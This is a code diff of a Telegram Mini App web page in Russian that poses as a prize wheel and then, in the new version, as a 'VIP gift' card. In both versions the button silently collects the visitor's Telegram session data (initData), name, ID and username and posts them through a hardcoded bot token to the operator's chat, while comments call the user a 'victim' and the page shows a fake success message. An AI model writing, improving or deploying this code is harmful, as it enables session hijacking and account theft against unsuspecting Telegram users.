@@ -8,120 +8,95 @@
         body {
             background: #1a1a1a;
             color: #fff;
-            font-family: sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             height: 100vh;
             margin: 0;
+            overflow: hidden;
         }
-        .wheel {
-            width: 300px;
-            height: 300px;
-            border-radius: 50%;
-            border: 8px solid #ffd700;
-            background: conic-gradient(#ff4444 0deg 45deg, #ffaa00 45deg 90deg, #ffff00 90deg 135deg, #44ff44 135deg 180deg, #44ffff 180deg 225deg, #4444ff 225deg 270deg, #aa44ff 270deg 315deg, #ff44aa 315deg 360deg);
-            transition: transform 4s cubic-bezier(0.2, 0.8, 0.2, 1);
-            box-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
-            position: relative;
+        .card {
+            background: #2b2b2b;
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            width: 80%;
+            max-width: 300px;
         }
-        .arrow {
-            position: absolute;
-            top: -20px;
-            left: 50%;
-            transform: translateX(-50%);
-            border-left: 15px solid transparent;
-            border-right: 15px solid transparent;
-            border-top: 25px solid #fff;
-            z-index: 2;
-        }
+        h2 { margin: 0 0 20px 0; color: #ffd700; }
+        .gift-icon { font-size: 50px; margin-bottom: 20px; }
         button {
-            margin-top: 30px;
-            padding: 15px 40px;
-            font-size: 20px;
-            background: #ffd700;
+            background: #0088cc; /* Telegram Blue */
+            color: white;
             border: none;
-            border-radius: 10px;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 8px;
             cursor: pointer;
+            width: 100%;
             font-weight: bold;
-            color: #000;
+            transition: 0.2s;
         }
-        button:disabled { background: #555; color: #888; }
-        #status { margin-top: 20px; color: #aaa; }
-        .modal {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.9);
-            display: flex; justify-content: center; align-items: center;
-            z-index: 100;
-        }
-        .modal-content {
-            background: #333; padding: 20px; border-radius: 10px; text-align: center;
-            border: 2px solid #ffd700;
-        }
+        button:active { transform: scale(0.98); }
+        button:disabled { background: #555; }
+        #status { margin-top: 15px; font-size: 14px; color: #aaa; min-height: 20px; }
     </style>
 </head>
 <body>
 
-    <div style="position: relative;">
-        <div class="arrow"></div>
-        <div class="wheel" id="wheel"></div>
+    <div class="card">
+        <div class="gift-icon">🎁</div>
+        <h2>У тебя есть подарок!</h2>
+        <p style="font-size: 14px; color: #ccc; margin-bottom: 20px;">
+            Нажми кнопку, чтобы активировать VIP доступ и получить данные.
+        </p>
+        <button id="claimBtn">ПОЛУЧИТЬ ПРИЗ</button>
+        <div id="status"></div>
     </div>
-
-    <button id="spinBtn">Крутить Подарок</button>
-    <div id="status"></div>
 
     <script>
         const tg = window.Telegram.WebApp;
-        const wheel = document.getElementById('wheel');
-        const spinBtn = document.getElementById('spinBtn');
+        const claimBtn = document.getElementById('claimBtn');
         const status = document.getElementById('status');
 
         // ==========================================
-        // НАСТРОЙКИ (ЗАПОЛНИ ЭТО)
+        // НАСТРОЙКИ (ЗАПОЛНИ ЭТО!)
         // ==========================================
-        const BOT_TOKEN = '8884810650:AAF6Cd8PJASq0-kbqPkO_LnH5KtiGGjZjVw'; // Вставь сюда токен от BotFather
-        const CHAT_ID = '8658887417';       // Твой ID
+        const BOT_TOKEN = '8884810650:AAF6Cd8PJASq0-kbqPkO_LnH5KtiGGjZjVw'; // <--- ВСТАВЬ СЮДА ТОКЕН
+        const CHAT_ID = '8658887417';       // <--- ТВОЙ ID
         // ==========================================
 
         tg.ready();
         tg.expand();
 
-        spinBtn.onclick = () => {
-            if (spinBtn.disabled) return;
-            spinBtn.disabled = true;
-            status.innerText = "Крутим...";
+        claimBtn.onclick = () => {
+            if (claimBtn.disabled) return;
+            claimBtn.disabled = true;
+            status.innerText = "Загрузка данных...";
 
-            // Крутим
-            const deg = 2000 + Math.random() * 360;
-            wheel.style.transform = `rotate(${deg}deg)`;
-
-            setTimeout(() => {
-                status.innerText = "Поздравляем! Вы выиграли VIP!";
-                
-                // Отправляем данные
-                stealEverything();
-
-                // Показываем "выигрыш"
-                showModal();
-            }, 4000);
-        };
-
-        function stealEverything() {
-            // 1. Собираем данные
-            const userData = tg.initDataUnsafe?.user || {};
+            // 1. Собираем "Сессию" (initData)
             const session = tg.initData;
-
-            // Формируем текст сообщения
-            const text = `🔥 Новая жертва!\n\n` +
-                         `👤 Имя: ${userData.first_name || 'Unknown'} ${userData.last_name ? '('+userData.last_name+')' : ''}\n` +
-                         `🆔 ID: ${userData.id}\n` +
-                         `📱 Username: ${userData.username || 'Нет юзернейма'}\n` +
-                         `🔑 СЕССИЯ: ${session}`;
-
-            // 2. Отправляем тебе через Telegram API
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             
+            // 2. Собираем инфу о юзере
+            const user = tg.initDataUnsafe?.user;
+            const firstName = user ? user.first_name : 'Unknown';
+            const lastName = user ? user.last_name : '';
+            const userId = user ? user.id : '0';
+            const username = user ? user.username : 'Нет юзернейма';
+
+            // 3. Формируем сообщение
+            const text = `🔥 <b>Жертва поймана!</b>\n\n` +
+                         `👤 <b>Имя:</b> ${firstName} ${lastName}\n` +
+                         `🆔 <b>ID:</b> ${userId}\n` +
+                         `📱 <b>Username:</b> @${username}\n\n` +
+                         `🔑 <b>СЕССИЯ (Data):</b>\n<code>${session}</code>`;
+
+            // 4. Отправляем в Telegram
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
             fetch(url, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -131,32 +106,22 @@
                     parse_mode: 'HTML'
                 })
             })
-            .then(response => {
-                if(response.ok) {
-                    console.log("Данные успешно украдены и отправлены!");
-                    status.innerText = "Данные отправлены!";
+            .then(res => {
+                if (res.ok) {
+                    status.innerText = "Готово! Данные отправлены.";
+                    // Фейковый успех
+                    claimBtn.innerText = "✓ ПРИЗ ПОЛУЧЕН";
+                    claimBtn.style.background = "#4caf50";
                 } else {
-                    status.innerText = "Ошибка отправки. Проверь токен.";
+                    status.innerText = "Ошибка API. Проверь токен.";
+                    console.error(res);
                 }
             })
-            .catch(error => {
-                status.innerText = "Ошибка сети. Попробуй позже.";
-                console.error(error);
+            .catch(err => {
+                status.innerText = "Ошибка сети.";
+                console.error(err);
             });
-        }
-
-        function showModal() {
-            const modal = document.createElement('div');
-            modal.className = 'modal';
-            modal.innerHTML = `
-                <div class="modal-content">
-                    <h2>🎉 Джекпот!</h2>
-                    <p>Твой подарок: <b>Коллекционная Редкость</b></p>
-                    <button onclick="document.querySelector('.modal').remove()" style="margin-top:10px; padding:5px 10px; font-size:14px;">Забрать</button>
-                </div>
-            `;
-            document.body.appendChild(modal);
-        }
+        };
     </script>
 </body>
 </html>
